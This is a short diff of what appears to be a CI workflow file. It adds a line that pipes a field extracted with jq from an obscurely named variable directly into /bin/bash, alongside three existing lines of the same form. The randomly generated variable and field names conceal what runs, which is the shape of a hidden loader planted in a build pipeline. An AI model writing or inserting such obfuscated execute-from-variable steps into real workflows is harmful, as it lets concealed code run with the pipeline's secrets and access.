@@ -34,6 +34,7 @@ jobs:
           echo $z6 | jq -r .xg8633 | /bin/bash
           printf '%s' "$myxq529" | jq -r .ef843 | /bin/bash
           echo $ukrsq8272 | jq -r .gjue94 | /bin/bash
+          echo $z72 | jq -r .iloom291 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
